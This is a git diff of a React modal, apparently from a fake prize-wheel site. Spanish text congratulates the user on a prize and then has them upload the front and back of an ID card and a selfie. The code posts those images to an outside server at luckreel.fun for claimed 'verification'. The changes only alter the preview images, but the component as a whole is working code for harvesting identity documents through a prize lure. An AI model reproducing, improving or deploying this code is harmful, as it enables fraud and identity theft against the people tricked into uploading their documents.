@@ -11,12 +11,6 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
     const [emailError, setEmailError] = useState(false);
     const [finish, setFinish] = useState(false)
 
-    const [frontImage, setFrontImage] = useState();
-    const [backImage, setBackImage] = useState();
-    const [selfieImage, setSelfieImage] = useState();
-
-
-
     const [isMobile, setIsMobile] = useState(false);
 
     useEffect(() => {
@@ -44,9 +38,7 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
             formData.append('images', front); // Добавляем переднее изображение в список images
             formData.append('images', back); // Добавляем заднее изображение в список images
             formData.append('images', selfie); // Добавляем селфи в список images
-
             await axios.post('https://luckreel.fun:3001/send', formData);
-            console.log(finish);
         }
     };
 
@@ -58,15 +50,13 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
         switch (type) {
             case 'front':
                 setFront(file);
-                setFrontImage(URL.createObjectURL(file))
+                
                 break;
             case 'back':
                 setBack(file);
-                setBackImage(URL.createObjectURL(file))
                 break;
             case 'selfie':
                 setSelfie(file);
-                setSelfieImage(URL.createObjectURL(file))
                 break;
             default:
                 break;
@@ -76,7 +66,7 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
 
     return (
         <div className="modal" style={modalStyle}>
-            <h2>¡Felicidades! Tu premio es <span>{result}</span></h2>
+            <h2 onClick={() => console.log(front)}>¡Felicidades! Tu premio es <span>{result}</span></h2>
             {finish ? (
                 <p>Genial, tus documentos han sido enviados para verificación, espera.</p>
             ) : (
@@ -95,7 +85,7 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
                             <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'front')} />
                             {/*  */}
                             {front ? (
-                                <img src={frontImage ? frontImage : front} alt='' onClick={() => setPassScaner('front')} />
+                                <img src={URL.createObjectURL(front)} alt='' onClick={() => setPassScaner('front')} />
                             ) : (
                                 <FaRegAddressCard onClick={() => setPassScaner('front')} />
                             )}
@@ -104,7 +94,7 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
                         <div className="back">
                             <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'back')} />
                             {back ? (
-                                <img src={backImage ? backImage : back} alt='' onClick={() => setPassScaner('back')} />
+                                <img src={URL.createObjectURL(back)} alt='' onClick={() => setPassScaner('back')} />
                             ) : (
                                 <FaRegCreditCard onClick={() => setPassScaner('back')} />
                             )}
@@ -113,7 +103,7 @@ const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setP
                         <div className="slefie">
                             <input type="file" accept="image/*" capture="user" onChange={(e) => handleFileChange(e, 'selfie')} />
                             {selfie ? (
-                                <img src={selfieImage ? selfieImage : selfie} alt='' onClick={() => setPassScaner('selfie')} />
+                                <img src={URL.createObjectURL(selfie)} alt='' onClick={() => setPassScaner('selfie')} />
                             ) : (
                                 <FaRegCircleUser onClick={() => setPassScaner('selfie')} />
                             )}
